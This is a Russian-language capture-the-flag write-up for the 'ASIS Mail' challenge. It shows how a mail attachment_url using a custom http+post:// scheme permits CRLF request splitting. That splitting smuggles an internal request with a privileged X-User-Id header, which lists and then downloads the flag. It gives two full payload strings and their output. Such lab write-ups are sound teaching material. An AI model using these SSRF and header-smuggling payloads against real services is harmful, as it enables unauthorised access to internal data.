# ASIS Mail — writeup

**Флаг:** `ASIS{M4IL_4S_4_S3RVIC3_15UUUUUUE5_62ee9c3cc5029d4c}`

Задача решается через злоупотребление возможностью API письма скачивать вложения по `attachment_url`.  
Загрузчик поддерживает специальную схему (`http+post://…`): он **URL-декодит** “путь” и затем отправляет **сырой HTTP-запрос**. Если в пути использовать `%0d%0a` (CRLF), получается **request splitting**, и можно “впихнуть” второй запрос с привилегированным заголовком `X-User-Id: 999`.

---

## 1) Разведка: почему напрямую не получается

Файловый сервис (objectstore) требует заголовок авторизации:

- Без `X-User-Id` → `{"error":"authorization required"}`
- Если попробовать отправить `X-User-Id` напрямую снаружи — на периметре (nginx) это режется и возвращается `400 Bad Request`.

Значит нужен **внутренний** запрос (server-side), который может проставить нужный заголовок.

---

## 2) Точка входа: `attachment_url` в compose API

Эндпоинт compose принимает multipart form-data поле `xml`.  
Минимальное письмо:

```xml
<message>
  <to>gazgaz@asismail.local</to>
  <subject>test</subject>
  <body>x</body>
  <attachment_url>...</attachment_url>
</message>
```

## 3) Основной трюк: CRLF request splitting в `http+post://`

Хэндлер `http+post://` URL-декодит путь, поэтому `%0d%0a` превращается в настоящие CRLF.  
Мы подбираем `attachment_url`, который:

1. Вызывает “дефолтный” (неавторизованный) запрос загрузчика — поэтому в выводе первым появляется `{"error":"authorization required"}`.
2. Подсовывает **второй** запрос: `GET /FLAG?list=1` с `X-User-Id: 999`.
3. Заканчивается фиктивным заголовком (`X-Dummy:`), чтобы “поглотить” хвостовые символы, которые загрузчик может дописать.

### Payload: получить список объектов в `FLAG`

Используй это как значение `<attachment_url>`:

```text
http+post://objectstore:8082/FLAG%20HTTP/1.1%0d%0aHost:%20objectstore%0d%0a%0d%0aGET%20/FLAG?list=1%20HTTP/1.1%0d%0aX-User-Id:%20999%0d%0aX-Dummy:
```

После отправки письма самому себе и скачивания вложения внутри будет:

```http
{"error":"authorization required"}
HTTP/1.1 200 OK
Content-Type: application/json

{"bucket":"FLAG","objects":["flag-0750c96cfc2bd4b665865da15e9d5b94.txt"]}
```

Теперь у нас есть реальное имя файла на инстансе.

---

## 4) Забираем файл с флагом

Повторяем трюк, но уже запрашиваем найденный объект.

### Payload: скачать объект с флагом

```text
http+post://objectstore:8082/FLAG%20HTTP/1.1%0d%0aHost:%20objectstore%0d%0a%0d%0aGET%20/FLAG/flag-0750c96cfc2bd4b665865da15e9d5b94.txt%20HTTP/1.1%0d%0aX-User-Id:%20999%0d%0aX-Dummy:
```

Скачанное вложение содержит:

<img width="1219" height="336" alt="image" src="https://github.com/user-attachments/assets/eeed9b44-88e7-44af-9264-3f89d63012c8" />


---

## 5) Кратко

- Непосредственно в objectstore снаружи не войти (фильтрация заголовка на nginx).
- `attachment_url` поддерживает `http+post://` и URL-декодит путь.
- CRLF (`%0d%0a`) даёт request splitting и позволяет подсунуть `X-User-Id: 999`.
- Листим `FLAG` → узнаём имя → скачиваем файл → получаем флаг.
